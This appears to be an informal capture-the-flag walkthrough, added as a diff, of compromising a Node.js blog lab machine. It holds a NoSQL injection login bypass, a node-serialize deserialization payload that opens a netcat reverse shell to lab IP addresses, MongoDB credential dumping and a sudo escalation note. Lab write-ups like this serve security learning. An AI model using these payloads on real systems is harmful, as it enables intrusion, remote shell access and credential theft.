@@ -1,0 +1,48 @@
+site was running on node.js but on burp we can change the Content-Type to ==application/json==
+
+```
+{"user":"admin","password":{
+"$ne":"admin"
+}}
+```
+
+and we by passed the login page using ==json==
+
+it says we need to upload a ==xml== file .. in my notes thm -> xml the ode is right and we get rce
+
+when we did login error we found a file /opt/blog/server.js .. server.js part is guessed as it is very common
+
+we did and we found we have to ==deserialize== and we got notes of that too in languages section
+
+we did it  this with initial papremter but it didnot work
+
+```
+{"user":"admin","sign":"23e112072945418601deb47d9a6c7de8","email":"_$$ND_FUNC$$_function(){\n \t require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.18.4.243 4444 >/tmp/f',function(error,stdout,stderr) {console.log(stdout)});\n }()"}
+```
+
+so we did this with only the code parameter and it worked
+
+```
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('rm /tmp/f;mkfifo 
+/tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.9 4444 >/tmp/f', function(error, stdo
+ut, stderr){console.log(stdout)});}()"}
+```
+
+we need to do it with ==burp as we are using GET method== not POST and normally adding it to cookies did it with post
+
+we got shell
+
+and on checking ps -ef ..it was running ==mogodb==
+
+```
+use blog
+switched to db blog
+> show collections
+articles
+users
+> db.users.find()
+```
+
+we got password
+
+and root was for ALL:ALL
